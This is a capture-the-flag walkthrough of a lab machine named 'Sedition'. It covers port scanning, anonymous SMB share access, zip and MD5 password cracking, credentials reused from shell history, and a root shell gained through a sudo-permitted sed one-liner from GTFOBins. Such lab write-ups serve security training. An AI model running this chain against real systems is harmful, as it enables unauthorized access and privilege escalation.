# Sedition [https://labs.thehackerslabs.com/machine/117]

# Nmap Scan Result

```
$ sudo nmap -sCV -p- 192.168.1.90

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 20:29 GMT
Nmap scan report for Sedition.powerhub (192.168.1.90)
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)

PORT      STATE SERVICE     VERSION

139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
65535/tcp open  ssh         OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
MAC Address: 08:00:27:0E:5E:A2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-13T20:29:49
|_  start_date: N/A
|_clock-skew: -1s
|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds
```

# SMB Enumeration

```
$ smbclient -N -L //192.168.1.90

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	backup          Disk      
	IPC$            IPC       IPC Service (Samba Server)
	nobody          Disk      Home Directories
SMB1 disabled -- no workgroup available
```

```
$ smbclient //192.168.1.90/backup -U Anonymous

Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul  6 18:02:53 2025
  ..                                  D        0  Sun Jul  6 19:15:13 2025
  secretito.zip                       N      216  Sun Jul  6 18:02:31 2025

		19480400 blocks of size 1024. 16188316 blocks available
smb: \> get secretito.zip

```

# Cracking zip password

zip2john secretito.zip > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```
$ john hash.txt --show

secretito.zip/password:sebastian:password:secretito.zip::secretito.zip

1 password hash cracked, 0 left
```

Got a password file - 

```
$ cat password 
elbunkermolagollon123
```

# ssh login (username - cowboy, password - elbunkermolagollon123)

```
$ ssh -p 65535 cowboy@192.168.1.90
```

# Initial Enumeration

```
cowboy@Sedition:~$ history
    1  history
    2  exit
    3  mariadb
    4  mariadb -u cowboy -pelbunkermolagollon123
    5  su debian
    6  clear
    7  ls
    8  pwd
    9  ls
   10  id
   11  history
   12  mysql -u cowboy -p
   13  su debian
   14  exit
   15  ls
   16  history
```

# mysql Enumeration (password - elbunkermolagollon123)

```
$ mysql -u cowboy -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

```
MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,001 sec)

MariaDB [(none)]> use bunker;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [bunker]> show TABLES;
+------------------+
| Tables_in_bunker |
+------------------+
| users            |
+------------------+
1 row in set (0,001 sec)

MariaDB [bunker]> SELECT * FROM users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,001 sec)

MariaDB [bunker]> 

```

# crackstation

7c6a180b36896a0a8c02787eeafb0e4c - password1

# User Flag

```
$ su debian
$ cd ~/
$ cat flag.txt
pinguinitopinguinazo

```
# Priv Esca

```
$ sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```

# GTFOBins

```
Sudo

It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    GNU version only. Also, this requires bash.

    sudo sed -n '1e exec sh 1>&0' /etc/hosts

```

# Root Flag

```
debian@Sedition:~$ sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
# cd /root
# cat root.txt
laflagdelbunkerderootmolaaunmas

```
